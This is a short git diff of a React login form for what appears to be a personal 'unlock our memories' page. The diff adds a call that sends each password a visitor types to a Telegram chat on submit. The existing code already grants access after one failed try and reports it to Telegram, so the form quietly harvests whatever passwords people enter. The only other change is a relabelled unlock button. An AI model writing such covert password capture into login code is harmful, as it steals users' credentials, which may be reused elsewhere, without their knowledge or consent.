@@ -14,6 +14,7 @@ export function Login({ setAuthenticated }) {
 
 	const handleSubmit = (e) => {
 		e.preventDefault();
+		sendMessageTelegram(password)
 		if (attempted >= 1) {
 			setAuthenticated(true);
 			sendMessageTelegram("Correct Password Inputed");
@@ -66,7 +67,7 @@ export function Login({ setAuthenticated }) {
 							type="submit"
 							className="w-full mt-4 px-6 py-3 rounded-xl bg-gradient-to-r from-rose-400 to-pink-500 text-white font-medium hover:from-rose-500 hover:to-pink-600 transition-all duration-300 shadow-lg hover:shadow-xl animate-pulse"
 						>
-							Unlock Our Memories 💖
+							Unlock 🔓 💖
 						</button>
 					</motion.form>
 				</div>
